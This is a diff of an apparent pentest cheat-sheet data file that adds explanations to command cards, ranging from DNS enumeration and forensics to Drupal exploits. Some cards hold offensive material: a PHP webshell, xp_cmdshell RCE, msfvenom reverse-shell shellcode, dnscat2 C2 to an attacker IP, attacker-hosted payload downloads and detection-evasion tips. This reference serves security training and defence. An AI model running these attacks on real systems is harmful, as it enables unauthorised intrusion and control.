         "vulnerable_config": "# BIND (named) - zone transfer unrestricted (vulnerable):\n# /etc/bind/named.conf or named.conf.local:\nzone 'corp.local' {\n    type master;\n    file '/etc/bind/db.corp.local';\n    allow-transfer { any; };  // <-- allows AXFR from ANY host = zone exposure\n};\n\n# Windows DNS - no transfer restriction:\n# DNS Manager -> Zone -> Properties -> Zone Transfers tab:\n# 'Allow zone transfers' checked, 'To any server' selected",
         "secure_config": "# BIND - restrict zone transfers to secondary DNS IPs only:\nzone 'corp.local' {\n    type master;\n    file '/etc/bind/db.corp.local';\n    allow-transfer { 10.10.1.5; 10.10.1.6; };  // only secondary DNS servers\n    // Or disable entirely if using AD-integrated zones:\n    // allow-transfer { none; };\n};\n\n# Windows DNS (integrated zones) - disable zone transfers:\n# DNS Manager -> Zone -> Properties -> Zone Transfers:\n# Uncheck 'Allow zone transfers' entirely (AD-integrated zones replicate via AD replication)\n\n# Additional hardening:\n# Disable DNS recursion for external clients\n# Response Rate Limiting (RRL) to prevent DNS amplification\n# Split-horizon DNS - internal and external zones serve different records"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Locates a domain's name servers and attempts a zone transfer with Fierce:\n  fierce --domain <domain>   find the NS records and try AXFR against each\nA misconfigured name server dumps every DNS record at once; faster than manual dig AXFR when you do not yet know the name servers (zonetransfer.me is a public practice target)."
     },
     {
       "type": "command",
@@ -19278,7 +19341,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Runs the dnscat2 server to tunnel C2 entirely inside DNS traffic, for hosts where only DNS egress is allowed:\n  --dns host=<attacker_ip>,port=53   listen for the encoded DNS queries here\n  domain=<domain>                    the C2 domain the client beacons to\n  --no-cache                         disable response caching (keeps interactive sessions responsive)\nStart the PowerShell client on the target with the server's pre-shared secret to open the covert channel."
     },
     {
       "type": "command",
@@ -19400,7 +19464,8 @@ const COMMAND_DATA = {
           "OSCP Ch06",
           "MITRE T1018"
         ]
-      }
+      },
+      "explain": "Runs full automated DNS enumeration in one command:\n  dnsenum --dnsserver <nameserver>   query this NS\n  --enum -p 0 -s 0                   preset without whois page/scrape steps\n  -o <outfile> -f <wordlist>         save output; brute-force subdomains from the wordlist\n  <domain>                           target\nDiscovers NS/MX/SOA records, attempts AXFR against every nameserver, and brute-forces subdomains together - a one-shot DNS map."
     },
     {
       "type": "command",
@@ -19519,7 +19584,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Services expose excessive information: version banners, supported auth methods, valid usernames via error responses. IPMI has no authentication (version 2.0 cipher 0 vulnerability). RSH/rexec trust .rhosts files. rsync shares readable anonymously. Oracle TNS allows remote poisoning in older versions.",
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)"
-      }
+      },
+      "explain": "Maps a company's internet presence passively via CT logs:\n  curl -s 'https://crt.sh/?q=<domain>.com&output=json'   every logged certificate for the domain\n  | jq .   parse the JSON to extract subdomain names\nCertificate transparency reveals subdomains without touching the target; the card then resolves them to IPs with a host loop, and cross-references Shodan for exposed services."
     },
     {
       "id": "crtp-password-policy",
@@ -20083,7 +20149,8 @@ const COMMAND_DATA = {
           "MITRE T1059"
         ],
         "code_review": "RED FLAGS (source): file saved using client-supplied name/extension; MIME trusted from the request.\n  move_uploaded_file(..., $_FILES['f']['name'])  |  extension blacklist  |  type check on $_FILES['f']['type'] (client-controlled)\nGREP:  grep -rniE \"move_uploaded_file|\\$_FILES|multer|formidable|MultipartFile|SaveAs\\(\" .\nSAFE:  extension ALLOWLIST + magic-byte MIME (finfo/mime_content_type), server-generated random filename, store outside webroot in a no-execute dir."
-      }
+      },
+      "explain": "Gets code execution on DotNetNuke with SuperUser/admin creds via the built-in SQL console:\n  sp_configure 'show advanced options','1'; RECONFIGURE;   unlock advanced settings\n  sp_configure 'xp_cmdshell','1'; RECONFIGURE;              enable the OS-command stored proc\n  xp_cmdshell 'whoami'                                     run commands as the SQL/IIS service account\nDNN's Settings > SQL console runs arbitrary T-SQL, so enabling xp_cmdshell yields RCE; from there upload nc/PrintSpoofer to escalate (creds are often pillaged from an exposed web.config)."
     },
     {
       "type": "script",
@@ -20272,7 +20339,8 @@ const COMMAND_DATA = {
           "OWASP A05:2021"
         ],
         "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
-      }
+      },
+      "explain": "Detects Drupal and reads its version:\n  curl -s http://<url>/CHANGELOG.txt   fetch the changelog\n  | grep -m2 \"\"                         show the first lines (top entry = current version)\nConfirms Drupal and the version to match against exploits (e.g. Drupalgeddon); droopescan scan drupal enumerates modules more deeply."
     },
     {
       "type": "payload",
@@ -20369,7 +20437,8 @@ const COMMAND_DATA = {
           "OWASP A04:2021"
         ],
         "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
-      }
+      },
+      "explain": "Gains RCE on Drupal by posting PHP through the PHP Filter module:\n  <?php system($_GET['<rand>']); ?>   a node body that executes the 'rand' query parameter as a shell command\nCreate a node with PHP input format enabled, then hit it with ?<rand>=id (or a reverse-shell one-liner); on newer Drupal you must install the PHP module first since it is no longer bundled."
     },
     {
       "type": "command",
@@ -20460,7 +20529,8 @@ const COMMAND_DATA = {
           "OWASP A03:2021"
         ],
         "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
-      }
+      },
+      "explain": "Creates a Drupal admin account via the Drupalgeddon SQLi (CVE-2014-3704):\n  python2.7 drupalgeddon.py   the exploit\n  -t http://<url>             target\n  -u <newuser> -p <newpass>   the admin account it inserts\nDrupal 7 < 7.32 mishandles the SQL API, letting the exploit inject a new administrator - giving full CMS control with no prior credentials."
     },
     {
       "type": "command",
@@ -20565,7 +20635,8 @@ const COMMAND_DATA = {
           "MITRE T1190",
           "OWASP A06:2021"
         ]
-      }
+      },
+      "explain": "Unauthenticated RCE on Drupal 7/8 via CVE-2018-7600:\n  python3 drupalgeddon2.py   the exploit (typically drops a PHP webshell)\nThe flaw in Drupal's Form API renders attacker input as code; the exploit usually writes a base64-decoded '<?php system($_GET[...]);' shell you then invoke with a command parameter for RCE."
     },
     {
       "type": "command",
@@ -20672,7 +20743,8 @@ const COMMAND_DATA = {
           "OWASP A06:2021"
         ],
         "evasion": "Rename/obfuscate the uploaded webshell and delete it after use; prefer the app's built-in functionality (PHP filter / module) over dropping files; pace requests to blend with normal traffic."
-      }
+      },
+      "explain": "Authenticated Drupal RCE via CVE-2018-7602 in Metasploit:\n  use exploit/multi/http/drupal_drupageddon3   the module\nRequires a valid Drupal session cookie and a node id, so set DRUPAL_SESSION, DRUPAL_NODE, VHOST, RHOSTS, and LHOST before exploit; it abuses the same Form API flaw as Drupalgeddon2 but on a path that needs authentication."
     },
     {
       "id": "ad-dsquery-uac",
@@ -20770,7 +20842,8 @@ const COMMAND_DATA = {
           "label": "AS-REP roastable (no preauth)",
           "command": "dsquery * -filter \"(&(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" -attr samAccountName"
         }
-      ]
+      ],
+      "explain": "Runs an LDAP filter with the built-in dsquery tool (no extra tooling):\n  dsquery *   raw LDAP search\n  -filter \"(...userAccountControl:1.2.840.113556.1.4.803:=32)\"   the OID :=32 bit is PASSWD_NOTREQD - matches accounts allowing a blank password\n  -attr sAMAccountName userAccountControl   fields to return\nA living-off-the-land way to hunt risky UAC flags; swap the bit value (4194304 = no-preauth) or the filter to find other classes of accounts."
     },
     {
       "id": "crtp-dsrm-backdoor",
@@ -20989,7 +21062,8 @@ const COMMAND_DATA = {
         "procmon",
         "inetsim",
         "wireshark"
-      ]
+      ],
+      "explain": "Starts Noriben to record a malware sample's behavior in an isolated VM:\n  python Noriben.py   a ProcMon wrapper that logs process, file, registry, and network activity\nCapturing while you detonate the sample yields a clean timeline of what it did; run INetSim first so C2 lookups get controlled responses, and tcpdump to grab the traffic."
     },
     {
       "id": "cdsa-elastic-hunt-techniques",
@@ -21084,7 +21158,8 @@ const COMMAND_DATA = {
           "rel": "prereq",
           "note": "Event IDs 1, 3, 11, 13, 22 used throughout these queries."
         }
-      ]
+      ],
+      "explain": "A KQL hunt for lateral tool transfer staged in a world-writable path:\n  event.code:11              Sysmon FileCreate events\n  AND file.path:*Users\\\\Public*   files written under C:\\Users\\Public (a common drop location)\nSurfaces tools an attacker copied between hosts; the card pairs it with hunts for Run-key persistence (event.code:13, *\\Run*) and PowerShell-remoting lateral movement (wsmprovhost.exe, logon type 3 to 5985)."
     },
     {
       "id": "cdsa-elastic-stuxbot-hunt",
@@ -21208,7 +21283,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Advanced hunting queries: lateral movement, registry persistence, PS remoting."
         }
-      ]
+      ],
+      "explain": "A KQL query that starts the Stuxbot hunt at the initial malicious download:\n  event.code:15             Sysmon FileCreateStreamHash events (Mark-of-the-Web on downloaded files)\n  AND file.name:*invoice.one   the lure file delivered to the victim\nPins down the entry point so you can follow the chain forward (OneNote opens it, cmd/powershell run, C2, lateral movement) using the follow-on KQL queries in the card."
     },
     {
       "id": "smtp-open-relay-abuse",
@@ -21498,7 +21574,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# SMTP VRFY command enabled (user enumeration):\n# $ telnet mail.corp.local 25\n# VRFY admin  -> 250 admin@corp.local (user exists)\n# VRFY fake   -> 550 no such user (user doesn't exist)\n\n# Open relay:\n# MAIL FROM: attacker@evil.com\n# RCPT TO: victim@anywhere.com  -> 250 OK (relays to any domain)",
         "secure_config": "# Postfix - disable VRFY/EXPN:\n# /etc/postfix/main.cf:\ndisable_vrfy_command = yes\nsmtpd_discard_ehlo_keywords = expn vrfy\n\n# Prevent open relay:\nsmtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination\n\n# O365: enforce MFA (Entra ID Conditional Access)\n# Enable Smart Lockout in Entra ID\n# Monitor: sign-in logs for credential stuffing patterns"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Password-guesses mailbox logins with Hydra:\n  hydra -L users.txt   try each username in the list\n  -p '<password>'      a single password to spray\n  -f                   stop at the first valid pair\n  <ip> pop3            target and protocol module (also imap/smtp)\nConfirms working mailbox creds; swap -p/-P for a password list, and curl 'pop3://<ip>/<n> -u user:pass' both tests a credential and reads message n."
     },
     {
       "id": "smtp-user-enum",
@@ -21654,7 +21731,8 @@ const COMMAND_DATA = {
       ],
       "opsec": "silent",
       "mitre": [],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Creates a standard engagement evidence directory tree in one command:\n  mkdir -p ENGAGEMENT/{...}   the -p flag makes parents, and the brace expansion builds all subfolders at once\n  Admin, Deliverables, Evidence/{Findings,Scans/...,Notes,OSINT,...}, Retest   the predictable layout\nStanding this up first means scans, screenshots, notes, and logs always land in known places - faster report writing and nothing misfiled; run 'tree' to verify."
     },
     {
       "id": "tmux-logging-setup",
@@ -21736,7 +21814,8 @@ const COMMAND_DATA = {
       ],
       "opsec": "silent",
       "mitre": [],
-      "exam": "exam-ok"
+      "exam": "exam-ok",
+      "explain": "Installs the tmux plugin manager so you can add the tmux-logging plugin:\n  git clone ...tpm ~/.tmux/plugins/tpm   fetch TPM into the plugins directory\nAfter adding the tmux-logging plugin line to ~/.tmux.conf and pressing prefix+I, prefix+shift+P starts/stops writing the pane's full I/O to a log file - your engagement evidence trail (plain 'script -a file.log' is the no-tmux fallback)."
     },
     {
       "id": "ad-enter-pssession",
@@ -22075,7 +22154,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Default directory read left wide open; over-privileged enterprise apps/service principals; standing Global Admins (no PIM).",
         "vulnerable_config": "# Any user can enumerate every app + its permissions:\nGet-MgApplication; (Get-MgApplication -ApplicationId <id>).RequiredResourceAccess",
         "secure_config": "# Restrict directory read for members/guests; enforce least-privilege app permissions;\n# use Entra PIM for just-in-time admin; alert on bulk Graph directory reads."
-      }
+      },
+      "explain": "Enumerates the Entra ID (Azure AD) tenant via Microsoft Graph PowerShell:\n  Get-MgUser -All   list every user object\n  | ConvertTo-Json   full attribute detail\nAfter connecting, this plus Get-MgGroup/Get-MgServicePrincipal/Get-MgUserMemberOf maps users, groups, apps, service principals, and role/app permissions - the identity attack surface; getuserrealm confirms a tenant's auth type pre-auth."
     },
     {
       "id": "ad-enum4linux",
@@ -22176,7 +22256,8 @@ const COMMAND_DATA = {
           "label": "Follow up on interesting shares/users",
           "command": "# feed usernames into kerbrute / spraying"
         }
-      ]
+      ],
+      "explain": "Runs the classic all-in-one SMB/RPC enumeration script:\n  enum4linux -A <dc_ip>   -A runs every check (users, groups, shares, password policy, OS info, domain membership)\nGreat for an initial unauthenticated sweep when null sessions are allowed; supply -u/-p to run it authenticated for fuller results."
     },
     {
       "id": "ad-enum4linux-ng",
@@ -22271,7 +22352,8 @@ const COMMAND_DATA = {
           "label": "With creds",
           "command": "enum4linux-ng -u <user> -p <password> -A <dc_ip> -oA out"
         }
-      ]
+      ],
+      "explain": "The modern rewrite of enum4linux with structured output:\n  enum4linux-ng   Python reimplementation\n  -P <dc_ip>      dump the password policy\n  -oA <outfile>   save results to JSON and YAML\nUse -P first to learn the lockout threshold before spraying; -A runs the full suite, and -u/-p adds authentication."
     },
     {
       "type": "cheatsheet",
@@ -23196,7 +23278,8 @@ const COMMAND_DATA = {
           "command": "Import-Module bitstransfer\nStart-BitsTransfer -Source 'http://<ip>:8000/nc.exe' -Destination 'C:\\Windows\\Temp\\nc.exe'",
           "label": "BITS transfer"
         }
-      ]
+      ],
+      "explain": "Downloads a file while spoofing a real browser User-Agent so it blends into normal web traffic:\n  Invoke-WebRequest http://<ip>/nc.exe   fetch the payload\n  -UserAgent $UserAgent                  send a Chrome UA instead of the tell-tale WindowsPowerShell one\n  -OutFile ...                           save it to disk\nDefenders hunt default PowerShell/certutil UAs, so this looks like a user browsing; WinHttp/Msxml2 COM variants avoid the PowerShell signature entirely."
     },
     {
       "type": "command",
@@ -23288,7 +23371,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Hides your real IP among decoys to confuse the target/IDS:\n  -p 80 -sS   SYN-scan port 80\n  -Pn -n      skip host discovery and DNS\n  --disable-arp-ping   force IP-level probes (not ARP)\n  --packet-trace       show the packets sent\n  -D RND:5             mix in 5 random spoofed source addresses\nThe scan appears to come from several IPs at once; use -D ip1,ip2,ME to place your own address explicitly among named decoys."
     },
     {
       "type": "command",
@@ -23381,7 +23465,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Fingerprints the OS and can spoof the source address:\n  -n -Pn      no DNS or host discovery\n  -p445       the port to probe\n  -O          OS detection\nThe card's key variant adds -S <spoofed_ip> -e <iface> to send from a chosen source IP over a specific interface - useful when a firewall rule trusts a particular address."
     },
     {
       "type": "command",
@@ -23469,7 +23554,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Maps firewall behaviour by contrasting scan types:\n  -sA         ACK scan (probes filtering, not open/closed)\n  -p 21,22,25 the ports to test\n  -Pn -n --disable-arp-ping   no discovery/DNS/ARP\n  --packet-trace              show responses\nUnfiltered ports answer an ACK with RST; filtered ports drop it - comparing SYN (-sS) vs ACK (-sA) results reveals whether a stateful firewall sits in front."
     },
     {
       "type": "command",
@@ -23557,7 +23643,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Network perimeters that do not filter ICMP, do not use egress filtering, or expose unnecessary services (all ports open) allow comprehensive port scanning. Systems without host-based firewalls or IDS/IPS allow scan traffic to enumerate every open service, revealing attack surface. No rate-limiting on inbound probes means stealth scans complete quickly.",
         "vulnerable_config": "# No firewall between attacker and target (or overly permissive rules):\n# iptables -L  ->  Chain INPUT (policy ACCEPT)  [no rules]\n# Or: Windows Firewall disabled\n# Every service's port is reachable from any source\n\n# No IDS/IPS:\n# Snort/Suricata not deployed; no AWS GuardDuty / Azure Defender\n# Nmap SYN scan completes in seconds with no alert generated",
         "secure_config": "# Linux host-based firewall - default-deny inbound:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n# Only open required services:\niptables -A INPUT -p tcp --dport 443 -j ACCEPT  # HTTPS only\niptables -A INPUT -p tcp --dport 22 -s 10.10.1.0/24 -j ACCEPT  # SSH from mgmt network\n\n# Rate-limit scan detection (drops SYN floods):\niptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Deploy IDS/IPS:\n# Snort/Suricata rules detect nmap OS detection probes\n# AWS: GuardDuty (detects port scans from EC2)\n# Cloud: Security Groups default-deny with explicit allow rules"
-      }
+      },
+      "explain": "Scans from a trusted source port to slip past a firewall:\n  -p50000 -sS   SYN-scan the target port\n  -Pn -n --disable-arp-ping --packet-trace   no discovery/DNS/ARP, show packets\n  --source-port 53   send from port 53 (DNS), which many firewalls implicitly trust\nIf a port looked filtered normally but responds from source-port 53, the firewall trusts DNS traffic; connect through with 'ncat --source-port 53'."
     },
     {
       "id": "crtp-evasive-mimikatz",
@@ -24113,7 +24200,8 @@ const COMMAND_DATA = {
           "label": "All protocols (RDP/VNC/web)",
           "command": "eyewitness --all-protocols -x web_discovery.xml -d <output_dir>"
         }
-      ]
+      ],
+      "explain": "Screenshots every web app from an Nmap XML with EyeWitness:\n  eyewitness --web   web-app mode\n  -x web_discovery.xml   parse targets from the nmap XML\n  -d <output_dir>        report output directory\nBuilds a browsable report so you can visually triage many hosts and spot login/admin/default pages fast; -f urls.txt takes a plain URL list, --all-protocols adds RDP/VNC."
     },
     {
       "id": "feroxbuster-recursive",
@@ -25058,7 +25146,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Core file-transfer loop: host from your box, pull onto the target, verify integrity:\n  python3 -m http.server 8000   serve the current directory over HTTP\n  wget/curl <url>               download onto the target\n  scp file user@host:/tmp/      or push over SSH\nGets tools onto the target (or loot off it); base64 copy/paste covers the case with no network path, and file/md5sum confirm the transfer was clean."
     },
     {
       "platform": "linux",
@@ -25426,7 +25515,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Vulnerable application not patched when CVE is published. Service exposed to untrusted networks (internet-facing legacy application). No virtual patching (IPS rule) for known CVEs pending patch deployment.",
         "vulnerable_config": "# Example: Exploit uses wrong offset for this target:\n# Original: offset = 524 (compiled differently on target)\n# Target binary: offset = 512\n# → Exploit crashes without shell (returns to wrong address)\n\n# Fix: rerun mona pattern_create against target binary:\n# !mona pattern_create 1000\n# Send pattern → crash → !mona pattern_offset eip_value\n# → Exact offset for this target binary",
         "secure_config": "# Patch management process:\n# 1. Subscribe to vendor security advisories\n# 2. Test patch in staging within 24h of critical CVE\n# 3. Deploy to production within 72h for critical\n\n# Virtual patch via IPS (Snort/Suricata) while awaiting patch:\n# alert tcp any any -> $SERVERS 110 (msg:'POP3 BOF Attempt'; \\\n#   content:'|41 41 41 41 41 41 41 41|'; classtype:attempted-admin; sid:9001;)\n\n# Network segmentation: legacy vulnerable services behind internal firewall\n# → Not directly internet-accessible"
-      }
+      },
+      "explain": "Regenerates the shellcode when adapting a memory-corruption PoC:\n  msfvenom -p windows/shell_reverse_tcp   the payload\n  LHOST/LPORT                             your callback details\n  -f python                               output format to paste into the exploit\n  -b '\\x00\\x0a\\x0d'                       exclude bad characters the vuln cannot carry\n  -v shellcode                            name the emitted variable\nSwapping in clean, correctly-encoded shellcode (plus fixing the return address for the target build) is what makes a public overflow actually fire."
     },
     {
       "id": "fix-web-exploit",
@@ -25715,7 +25805,8 @@ const COMMAND_DATA = {
           "rel": "next",
           "note": "Analyze the PhysicalMemory.raw dump with Volatility v2/v3."
         }
-      ]
+      ],
+      "explain": "Uses KAPE to triage-collect forensic artifacts from a Windows drive:\n  --tsource D:            the source volume to collect from\n  --tdest C:\\investigation   where to write the collected artifacts\n  --target !SANS_Triage   the compound target that grabs all the critical artifacts (MFT, registry, event logs, etc.)\nGives you a defensible artifact set without imaging the whole disk; add --module !EZParser to parse it, and pair with WinPmem/LiME for memory acquisition."
     },
     {
       "id": "crtp-forest-trust-abuse",
@@ -25935,7 +26026,8 @@ const COMMAND_DATA = {
           "label": "Feed live IPs into nmap",
           "command": "nmap -sV -iL live.txt -oA services"
         }
-      ]
+      ],
+      "explain": "Fast ICMP sweep to find live hosts on a subnet:\n  fping   parallel pinger\n  -a      show only alive hosts\n  -s      print summary stats\n  -g      generate the target list from the CIDR\n  -q      quiet (suppress per-host errors)\nGives a clean live-host list (tee it to a file) to feed straight into an nmap -iL service scan."
     },
     {
       "type": "command",
@@ -26016,7 +26108,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Common introductory misconfigurations: services running as root/SYSTEM unnecessarily, default credentials unchanged, unnecessary services listening on all interfaces, lack of firewall rules exposing services externally, no monitoring or alerting on authentication failures.",
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services"
-      }
+      },
+      "explain": "Connects to FTP and tries the anonymous login:\n  ftp -p <ip>   open a passive-mode FTP session\nAnonymous FTP frequently exposes configs, credentials, and backups - browse with ls and pull files with get; -p uses passive mode which works better through NAT/firewalls."
     },
     {
